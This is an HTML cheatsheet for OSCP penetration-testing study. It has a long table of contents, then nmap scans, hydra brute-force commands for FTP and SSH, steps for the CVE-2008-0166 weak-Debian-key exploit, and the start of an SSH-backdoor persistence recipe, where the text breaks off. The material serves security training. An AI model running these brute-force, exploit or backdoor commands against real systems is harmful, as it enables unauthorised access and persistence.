{"title":"OSCP Cheatsheet","slug":"OSCP-Cheatsheet","html":"<h1 id=\"oscp-cheatsheet\">OSCP Cheatsheet</h1>\n<ul>\n<li><p><a onclick=\"document.location.hash='enumeration';\" href=\"javascript:;\">Enumeration</a></p>\n</li>\n<li><p><a onclick=\"document.location.hash='nmap';\" href=\"javascript:;\">NMAP</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='tcp';\" href=\"javascript:;\">TCP</a></li>\n<li><a onclick=\"document.location.hash='udp';\" href=\"javascript:;\">UDP</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='ftp---21';\" href=\"javascript:;\">FTP - 21</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='brute-force';\" href=\"javascript:;\">Brute force</a></li>\n<li><a onclick=\"document.location.hash='downloading-file';\" href=\"javascript:;\">Downloading file</a></li>\n<li><a onclick=\"document.location.hash='uploading-file';\" href=\"javascript:;\">Uploading file</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='ssh---22';\" href=\"javascript:;\">SSH - 22</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='brute-force-1';\" href=\"javascript:;\">Brute force</a></li>\n<li><a onclick=\"document.location.hash='cve-2008-0166';\" href=\"javascript:;\">CVE-2008-0166</a></li>\n<li><a onclick=\"document.location.hash='ssh-backdoor---post-exploitation';\" href=\"javascript:;\">SSH backdoor - post exploitation</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='dns---53';\" href=\"javascript:;\">DNS - 53</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='zone-transfert';\" href=\"javascript:;\">Zone transfert</a></li>\n<li><a onclick=\"document.location.hash='dns-brute-force';\" href=\"javascript:;\">DNS brute force</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='finger---79';\" href=\"javascript:;\">FINGER - 79</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='user-enumeration';\" href=\"javascript:;\">User enumeration</a></li>\n<li><a onclick=\"document.location.hash='command-execution';\" href=\"javascript:;\">Command execution</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='http---https---80---443';\" href=\"javascript:;\">HTTP - HTTPS - 80 - 443</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='automatic-scanners';\" href=\"javascript:;\">Automatic scanners</a></li>\n<li><a onclick=\"document.location.hash='wordpress';\" href=\"javascript:;\">Wordpress</a><ul>\n<li><a onclick=\"document.location.hash='wordpress-panel-rce';\" href=\"javascript:;\">Wordpress panel RCE</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='drupal';\" href=\"javascript:;\">Drupal</a><ul>\n<li><a onclick=\"document.location.hash='username-enumeration';\" href=\"javascript:;\">Username enumeration</a></li>\n<li><a onclick=\"document.location.hash='hidden-pages-enumeration';\" href=\"javascript:;\">Hidden pages enumeration</a></li>\n<li><a onclick=\"document.location.hash='drupal-panel-rce';\" href=\"javascript:;\">Drupal panel RCE</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='joomla';\" href=\"javascript:;\">Joomla</a></li>\n<li><a onclick=\"document.location.hash='tomcat';\" href=\"javascript:;\">Tomcat</a><ul>\n<li><a onclick=\"document.location.hash='default-credentials';\" href=\"javascript:;\">Default credentials</a></li>\n<li><a onclick=\"document.location.hash='brute-force-2';\" href=\"javascript:;\">Brute force</a></li>\n<li><a onclick=\"document.location.hash='tomcat-panel-rce';\" href=\"javascript:;\">Tomcat panel RCE</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='webdav';\" href=\"javascript:;\">WebDav</a></li>\n<li><a onclick=\"document.location.hash='http-brute-force-authentication';\" href=\"javascript:;\">HTTP brute force authentication</a><ul>\n<li><a onclick=\"document.location.hash='http-basic-authentication';\" href=\"javascript:;\">HTTP basic authentication</a></li>\n<li><a onclick=\"document.location.hash='http-get-request';\" href=\"javascript:;\">HTTP GET request</a></li>\n<li><a onclick=\"document.location.hash='http-post-request';\" href=\"javascript:;\">HTTP POST request</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='spidering--brute-force-directories--files';\" href=\"javascript:;\">Spidering / Brute force directories / files</a><ul>\n<li><a onclick=\"document.location.hash='file-backups';\" href=\"javascript:;\">File backups</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='local-file-inclusion--remote-file-inclusion---lfi--rfi';\" href=\"javascript:;\">Local File Inclusion / Remote File Inclusion - LFI / RFI</a><ul>\n<li><a onclick=\"document.location.hash='wrappers';\" href=\"javascript:;\">Wrappers</a><ul>\n<li><a onclick=\"document.location.hash='wrapper-phpfilter';\" href=\"javascript:;\">Wrapper php://filter</a></li>\n<li><a onclick=\"document.location.hash='wrapper-expect';\" href=\"javascript:;\">Wrapper expect://</a></li>\n<li><a onclick=\"document.location.hash='wrapper-data';\" href=\"javascript:;\">Wrapper data://</a></li>\n<li><a onclick=\"document.location.hash='wrapper-input';\" href=\"javascript:;\">Wrapper input://</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='useful-lfi-list';\" href=\"javascript:;\">Useful LFI list</a></li>\n<li><a onclick=\"document.location.hash='tools';\" href=\"javascript:;\">Tools</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='command-injection';\" href=\"javascript:;\">Command injection</a></li>\n<li><a onclick=\"document.location.hash='deserialization';\" href=\"javascript:;\">Deserialization</a></li>\n<li><a onclick=\"document.location.hash='file-upload';\" href=\"javascript:;\">File upload</a></li>\n<li><a onclick=\"document.location.hash='sql-injection';\" href=\"javascript:;\">SQL injection</a></li>\n<li><a onclick=\"document.location.hash='xss';\" href=\"javascript:;\">XSS</a></li>\n<li><a onclick=\"document.location.hash='other-web-vulnerabilities';\" href=\"javascript:;\">Other web vulnerabilities</a></li>\n<li><a onclick=\"document.location.hash='upload-a-file-with-put';\" href=\"javascript:;\">Upload a file with PUT</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='kerberos---88';\" href=\"javascript:;\">KERBEROS - 88</a></p>\n</li>\n<li><p><a onclick=\"document.location.hash='pop3---110';\" href=\"javascript:;\">POP3 - 110</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='brute-force-3';\" href=\"javascript:;\">Brute force</a></li>\n<li><a onclick=\"document.location.hash='read-mail';\" href=\"javascript:;\">Read mail</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='snmp---161';\" href=\"javascript:;\">SNMP - 161</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='brute-force-community-string';\" href=\"javascript:;\">Brute force community string</a></li>\n<li><a onclick=\"document.location.hash='modifying-snmp-values';\" href=\"javascript:;\">Modifying SNMP values</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='ldap---389';\" href=\"javascript:;\">LDAP - 389</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='scans';\" href=\"javascript:;\">Scans</a></li>\n<li><a onclick=\"document.location.hash='graphical-interface';\" href=\"javascript:;\">Graphical Interface</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='smb---445';\" href=\"javascript:;\">SMB - 445</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='version-if-nmap-didnt-detect-it';\" href=\"javascript:;\">Version if nmap didn&#39;t detect it</a></li>\n<li><a onclick=\"document.location.hash='scan-for-vulnerability';\" href=\"javascript:;\">Scan for vulnerability</a></li>\n<li><a onclick=\"document.location.hash='manual-testing';\" href=\"javascript:;\">Manual testing</a></li>\n<li><a onclick=\"document.location.hash='brute-force-4';\" href=\"javascript:;\">Brute force</a></li>\n<li><a onclick=\"document.location.hash='mount-a-smb-share';\" href=\"javascript:;\">Mount a SMB share</a></li>\n<li><a onclick=\"document.location.hash='get-a-shell';\" href=\"javascript:;\">Get a shell</a></li>\n<li><a onclick=\"document.location.hash='EternalBlue-MS17-010';\" href=\"javascript:;\">EternalBlue (MS17-010)</a><ul>\n<li><a onclick=\"document.location.hash='check-if-vulnerable';\" href=\"javascript:;\">Check if vulnerable</a></li>\n<li><a onclick=\"document.location.hash='prepare-shellcodes-and-listeners';\" href=\"javascript:;\">Prepare shellcodes and listeners</a></li>\n<li><a onclick=\"document.location.hash='exploit';\" href=\"javascript:;\">Exploit</a></li>\n<li><a onclick=\"document.location.hash='if-this-doesnt-work-try-this-one';\" href=\"javascript:;\">If this doesn&#39;t work, try this one</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='ms08-067';\" href=\"javascript:;\">MS08-067</a></li>\n<li><a onclick=\"document.location.hash='cve-2017-7494';\" href=\"javascript:;\">CVE-2017-7494</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='mssql---1433';\" href=\"javascript:;\">MSSQL - 1433</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='get-information';\" href=\"javascript:;\">Get information</a></li>\n<li><a onclick=\"document.location.hash='brute-force-5';\" href=\"javascript:;\">Brute force</a></li>\n<li><a onclick=\"document.location.hash='having-credentials';\" href=\"javascript:;\">Having credentials</a></li>\n<li><a onclick=\"document.location.hash='manual-exploit';\" href=\"javascript:;\">Manual exploit</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='nfs---2049';\" href=\"javascript:;\">NFS - 2049</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='show-mountable-nfs-shares';\" href=\"javascript:;\">Show Mountable NFS Shares</a></li>\n<li><a onclick=\"document.location.hash='mount-a-share';\" href=\"javascript:;\">Mount a share</a></li>\n<li><a onclick=\"document.location.hash='nfs-misconfigurations';\" href=\"javascript:;\">NFS misconfigurations</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='mysql---3306';\" href=\"javascript:;\">MYSQL - 3306</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='brute-force-6';\" href=\"javascript:;\">Brute force</a></li>\n<li><a onclick=\"document.location.hash='extracting-mysql-credentials-from-files';\" href=\"javascript:;\">Extracting MySQL credentials from files</a></li>\n<li><a onclick=\"document.location.hash='connect';\" href=\"javascript:;\">Connect</a></li>\n<li><a onclick=\"document.location.hash='mysql-commands';\" href=\"javascript:;\">MySQL commands</a></li>\n<li><a onclick=\"document.location.hash='manual-exploit-1';\" href=\"javascript:;\">Manual exploit</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='rdp---3389';\" href=\"javascript:;\">RDP - 3389</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='brute-force';\" href=\"javascript:;\">Brute force</a></li>\n<li><a onclick=\"document.location.hash='connect-with-known-credentials--hash';\" href=\"javascript:;\">Connect with known credentials / hash</a></li>\n<li><a onclick=\"document.location.hash='session-stealing';\" href=\"javascript:;\">Session stealing</a><ul>\n<li><a onclick=\"document.location.hash='get-openned-sessions';\" href=\"javascript:;\">Get openned sessions</a></li>\n<li><a onclick=\"document.location.hash='access-to-the-selected';\" href=\"javascript:;\">Access to the selected</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='adding-user-to-rdp-group-windows';\" href=\"javascript:;\">Adding user to RDP group (Windows)</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='vnc---5800---58001---5900---5901';\" href=\"javascript:;\">VNC - 5800 - 58001 - 5900 - 5901</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='scans-1';\" href=\"javascript:;\">Scans</a></li>\n<li><a onclick=\"document.location.hash='brute-force-8';\" href=\"javascript:;\">Brute force</a></li>\n<li><a onclick=\"document.location.hash='connect-1';\" href=\"javascript:;\">Connect</a></li>\n<li><a onclick=\"document.location.hash='found-vnc-password';\" href=\"javascript:;\">Found VNC password</a><ul>\n<li><a onclick=\"document.location.hash='linux';\" href=\"javascript:;\">Linux</a></li>\n<li><a onclick=\"document.location.hash='windows';\" href=\"javascript:;\">Windows</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='decrypt-vnc-password';\" href=\"javascript:;\">Decrypt VNC password</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='winrm---5985---5986';\" href=\"javascript:;\">WINRM - 5985 - 5986</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='brute-force-9';\" href=\"javascript:;\">Brute force</a></li>\n<li><a onclick=\"document.location.hash='connecting';\" href=\"javascript:;\">Connecting</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='cgi';\" href=\"javascript:;\">CGI</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='found-cgi-scripts';\" href=\"javascript:;\">Found CGI scripts</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='command-and-control-framework';\" href=\"javascript:;\">Command and control framework</a></p>\n</li>\n<li><p><a onclick=\"document.location.hash='compiling-exploits';\" href=\"javascript:;\">Compiling exploits</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='for-linux';\" href=\"javascript:;\">For linux</a></li>\n<li><a onclick=\"document.location.hash='for-windows';\" href=\"javascript:;\">For windows</a></li>\n<li><a onclick=\"document.location.hash='cross-compile';\" href=\"javascript:;\">Cross compile</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='dictionary-generation';\" href=\"javascript:;\">DICTIONARY GENERATION</a></p>\n</li>\n<li><p><a onclick=\"document.location.hash='file-transfer';\" href=\"javascript:;\">FILE TRANSFER</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='linux-1';\" href=\"javascript:;\">Linux</a></li>\n<li><a onclick=\"document.location.hash='windows-1';\" href=\"javascript:;\">Windows</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='git';\" href=\"javascript:;\">GIT</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='download-git';\" href=\"javascript:;\">Download .git</a></li>\n<li><a onclick=\"document.location.hash='extract-git-content';\" href=\"javascript:;\">Extract .git content</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='hashes';\" href=\"javascript:;\">HASHES</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='windows-2';\" href=\"javascript:;\">Windows</a></li>\n<li><a onclick=\"document.location.hash='linux-2';\" href=\"javascript:;\">Linux</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='mimikatz';\" href=\"javascript:;\">MIMIKATZ</a></p>\n</li>\n<li><p><a onclick=\"document.location.hash='miscellaneous';\" href=\"javascript:;\">MISCELLANEOUS</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='get-a-windows-path-without-spaces';\" href=\"javascript:;\">Get a Windows path without spaces</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='msfvenom-payload';\" href=\"javascript:;\">MSFVENOM PAYLOAD</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='linux-3';\" href=\"javascript:;\">Linux</a></li>\n<li><a onclick=\"document.location.hash='windows-3';\" href=\"javascript:;\">Windows</a></li>\n<li><a onclick=\"document.location.hash='php';\" href=\"javascript:;\">PHP</a></li>\n<li><a onclick=\"document.location.hash='asp';\" href=\"javascript:;\">ASP</a></li>\n<li><a onclick=\"document.location.hash='jsp';\" href=\"javascript:;\">JSP</a></li>\n<li><a onclick=\"document.location.hash='war';\" href=\"javascript:;\">WAR</a></li>\n<li><a onclick=\"document.location.hash='python';\" href=\"javascript:;\">Python</a></li>\n<li><a onclick=\"document.location.hash='bash';\" href=\"javascript:;\">Bash</a></li>\n<li><a onclick=\"document.location.hash='perl';\" href=\"javascript:;\">Perl</a></li>\n<li><a onclick=\"document.location.hash='listener';\" href=\"javascript:;\">Listener</a><ul>\n<li><a onclick=\"document.location.hash='metasploit';\" href=\"javascript:;\">Metasploit</a></li>\n<li><a onclick=\"document.location.hash='netcat';\" href=\"javascript:;\">Netcat</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='password-cracking';\" href=\"javascript:;\">PASSWORD CRACKING</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='online';\" href=\"javascript:;\">Online</a></li>\n<li><a onclick=\"document.location.hash='hashcat';\" href=\"javascript:;\">Hashcat</a><ul>\n<li><a onclick=\"document.location.hash='linux-password';\" href=\"javascript:;\">Linux password</a></li>\n<li><a onclick=\"document.location.hash='windows-password';\" href=\"javascript:;\">Windows password</a></li>\n<li><a onclick=\"document.location.hash='others';\" href=\"javascript:;\">Others</a></li>\n<li><a onclick=\"document.location.hash='rules';\" href=\"javascript:;\">Rules</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='john';\" href=\"javascript:;\">John</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='pivoting';\" href=\"javascript:;\">PIVOTING</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='sshuttle';\" href=\"javascript:;\">Sshuttle</a></li>\n<li><a onclick=\"document.location.hash='proxychains';\" href=\"javascript:;\">Proxychains</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='privile-escalation';\" href=\"javascript:;\">PRIVILE ESCALATION</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='linux-4';\" href=\"javascript:;\">Linux</a><ul>\n<li><a onclick=\"document.location.hash='enumeration-scripts';\" href=\"javascript:;\">Enumeration scripts</a></li>\n<li><a onclick=\"document.location.hash='vulnerability-scan';\" href=\"javascript:;\">Vulnerability scan</a></li>\n<li><a onclick=\"document.location.hash='suid-checker';\" href=\"javascript:;\">Suid checker</a></li>\n<li><a onclick=\"document.location.hash='methodology-to-follow';\" href=\"javascript:;\">Methodology to follow</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='windows-4';\" href=\"javascript:;\">Windows</a><ul>\n<li><a onclick=\"document.location.hash='enumeration-scripts-1';\" href=\"javascript:;\">Enumeration scripts</a><ul>\n<li><a onclick=\"document.location.hash='general-scans';\" href=\"javascript:;\">General scans</a></li>\n<li><a onclick=\"document.location.hash='search-for-cve';\" href=\"javascript:;\">Search for CVE</a></li>\n<li><a onclick=\"document.location.hash='post-exploitation';\" href=\"javascript:;\">Post exploitation</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='juicypotato-seimpersonate-or-seassignprimarytoken';\" href=\"javascript:;\">JuicyPotato (SeImpersonate or SeAssignPrimaryToken)</a></li>\n<li><a onclick=\"document.location.hash='methodology-to-follow-1';\" href=\"javascript:;\">Methodology to follow</a></li>\n<li><a onclick=\"document.location.hash='autorun';\" href=\"javascript:;\">Autorun</a><ul>\n<li><a onclick=\"document.location.hash='detection';\" href=\"javascript:;\">Detection</a></li>\n<li><a onclick=\"document.location.hash='exploitation';\" href=\"javascript:;\">Exploitation</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='alwaysinstallelevated';\" href=\"javascript:;\">AlwaysInstallElevated</a><ul>\n<li><a onclick=\"document.location.hash='detection-1';\" href=\"javascript:;\">Detection</a></li>\n<li><a onclick=\"document.location.hash='exploitation-1';\" href=\"javascript:;\">Exploitation</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='executable-files';\" href=\"javascript:;\">Executable Files</a><ul>\n<li><a onclick=\"document.location.hash='detection-2';\" href=\"javascript:;\">Detection</a></li>\n<li><a onclick=\"document.location.hash='exploitation-2';\" href=\"javascript:;\">Exploitation</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='startup-applications';\" href=\"javascript:;\">Startup applications</a><ul>\n<li><a onclick=\"document.location.hash='detection-3';\" href=\"javascript:;\">Detection</a></li>\n<li><a onclick=\"document.location.hash='exploitation-3';\" href=\"javascript:;\">Exploitation</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='weak-service-permission';\" href=\"javascript:;\">Weak service permission</a><ul>\n<li><a onclick=\"document.location.hash='detection-4';\" href=\"javascript:;\">Detection</a></li>\n<li><a onclick=\"document.location.hash='exploitation-4';\" href=\"javascript:;\">Exploitation</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='unquoted-service-paths';\" href=\"javascript:;\">Unquoted service paths</a><ul>\n<li><a onclick=\"document.location.hash='detection-5';\" href=\"javascript:;\">Detection</a></li>\n<li><a onclick=\"document.location.hash='exploitation-5';\" href=\"javascript:;\">Exploitation</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='hot-potato';\" href=\"javascript:;\">Hot potato</a><ul>\n<li><a onclick=\"document.location.hash='exploitation-6';\" href=\"javascript:;\">Exploitation</a></li>\n</ul>\n</li>\n<li><a onclick=\"document.location.hash='cve';\" href=\"javascript:;\">CVE</a><ul>\n<li><a onclick=\"document.location.hash='windows-xp';\" href=\"javascript:;\">Windows XP</a></li>\n<li><a onclick=\"document.location.hash='windows-7';\" href=\"javascript:;\">Windows 7</a></li>\n<li><a onclick=\"document.location.hash='windows-8';\" href=\"javascript:;\">Windows 8</a></li>\n<li><a onclick=\"document.location.hash='windows-10';\" href=\"javascript:;\">Windows 10</a></li>\n<li><a onclick=\"document.location.hash='windows-server-2003';\" href=\"javascript:;\">Windows Server 2003</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='proofs';\" href=\"javascript:;\">PROOFS</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='linux-5';\" href=\"javascript:;\">Linux</a></li>\n<li><a onclick=\"document.location.hash='windows-5';\" href=\"javascript:;\">Windows</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='reverse-shell';\" href=\"javascript:;\">REVERSE SHELL</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='amazing-tool-for-shell-generation';\" href=\"javascript:;\">Amazing tool for shell generation</a></li>\n<li><a onclick=\"document.location.hash='bash-1';\" href=\"javascript:;\">Bash</a></li>\n<li><a onclick=\"document.location.hash='perl-1';\" href=\"javascript:;\">Perl</a></li>\n<li><a onclick=\"document.location.hash='python-1';\" href=\"javascript:;\">Python</a></li>\n<li><a onclick=\"document.location.hash='netcat-1';\" href=\"javascript:;\">Netcat</a></li>\n<li><a onclick=\"document.location.hash='more-reverse-shell';\" href=\"javascript:;\">More reverse shell</a></li>\n<li><a onclick=\"document.location.hash='interactive-shell';\" href=\"javascript:;\">Interactive shell</a></li>\n<li><a onclick=\"document.location.hash='adjust-interactive-shell';\" href=\"javascript:;\">Adjust Interactive shell</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='shellshock';\" href=\"javascript:;\">SHELLSHOCK</a></p>\n</li>\n<li><p><a onclick=\"document.location.hash='useful-linux-commands';\" href=\"javascript:;\">USEFUL LINUX COMMANDS</a></p>\n<ul>\n<li><a onclick=\"document.location.hash='find-a-file';\" href=\"javascript:;\">Find a file</a></li>\n<li><a onclick=\"document.location.hash='active-connection';\" href=\"javascript:;\">Active connection</a></li>\n<li><a onclick=\"document.location.hash='list-all-suid-files';\" href=\"javascript:;\">List all SUID files</a></li>\n<li><a onclick=\"document.location.hash='determine-the-current-version-of-linux';\" href=\"javascript:;\">Determine the current version of Linux</a></li>\n<li><a onclick=\"document.location.hash='determine-more-information-about-the-environment';\" href=\"javascript:;\">Determine more information about the environment</a></li>\n<li><a onclick=\"document.location.hash='list-processes-running';\" href=\"javascript:;\">List processes running</a></li>\n<li><a onclick=\"document.location.hash='list-the-allowed-and-forbidden-commands-for-the-invoking-use';\" href=\"javascript:;\">List the allowed (and forbidden) commands for the invoking use</a></li>\n</ul>\n</li>\n<li><p><a onclick=\"document.location.hash='useful-windows-commands';\" href=\"javascript:;\">USEFUL WINDOWS COMMANDS</a></p>\n</li>\n<li><p><a onclick=\"document.location.hash='zip';\" href=\"javascript:;\">ZIP</a></p>\n</li>\n</ul>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<pre class=\"language-\"><code class=\"language-\">nmap -sn -v <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/CIDR</code></pre><pre class=\"language-\"><code class=\"language-\">nmapAutomator <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> All</code></pre><pre class=\"language-\"><code class=\"language-\">autorecon <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>/CIDR</code></pre><hr>\n<h2 id=\"nmap\">NMAP</h2>\n<h3 id=\"tcp\">TCP</h3>\n<pre class=\"language-\"><code class=\"language-\">sudo -sS -sC -sV -oA <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>NAME</span><span class=\"token punctuation\">></span></span>.tcp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -v</code></pre><h3 id=\"udp\">UDP</h3>\n<pre class=\"language-\"><code class=\"language-\">sudo -sU -sS -sC -sV -oA <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>NAME</span><span class=\"token punctuation\">></span></span>.udp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -v</code></pre><hr>\n<h2 id=\"ftp---21\">FTP - 21</h2>\n<h3 id=\"brute-force\">Brute force</h3>\n<pre class=\"language-\"><code class=\"language-\">hydra -V -f -L <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERS_LIST</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> ftp://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u -vV</code></pre><h3 id=\"downloading-file\">Downloading file</h3>\n<pre class=\"language-\"><code class=\"language-\">ftp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nPASSIVE\nBINARY\nget <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"uploading-file\">Uploading file</h3>\n<pre class=\"language-\"><code class=\"language-\">ftp <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span>\nPASSIVE\nBINARY\nput <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILE</span><span class=\"token punctuation\">></span></span></code></pre><hr>\n<h2 id=\"ssh---22\">SSH - 22</h2>\n<h3 id=\"brute-force-1\">Brute force</h3>\n<pre class=\"language-\"><code class=\"language-\">hydra -V -f -L <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USERS_LIST</span><span class=\"token punctuation\">></span></span> -P <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PASSWORDS_LIST</span><span class=\"token punctuation\">></span></span> ssh://<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> -u -vV</code></pre><h3 id=\"cve-2008-0166\">CVE-2008-0166</h3>\n<pre class=\"language-\"><code class=\"language-\">All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.\n\nhttps://www.exploit-db.com/exploits/5720\n\nwget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2 https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_dsa_1024_x86.tar.bz2\n\nbunzip2 debian_ssh_rsa_2048_x86.tar.bz2 debian_ssh_dsa_1024_x86.tar.bz2\ntar -xvf debian_ssh_rsa_2048_x86.tar\ntar -xvf debian_ssh_dsa_1024_x86.tar\n\npython 5720 rsa/2048 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>THREADS</span><span class=\"token punctuation\">></span></span>\npython 5720 dsa/1024 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>IP</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>USER</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>PORT</span><span class=\"token punctuation\">></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>THREADS</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"ssh-backdoor---post-exploitation\">SSH backdoor - post exploitation</h3>\n<pre class=\"language-\"><code class=\"language-\"># Attacker\nssh-keygen -f <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILENAME</span><span class=\"token punctuation\">></span></span>\nchmod 600 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILENAME</span><span class=\"token punctuation\">></span></span>\ncat <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILENAME</span><span class=\"token punctuation\">></span></span>.pub -> copy\n\n# Victim\necho <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>FILENAME</span><span class=\"token punctuation\">></span></span>.pub >> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token 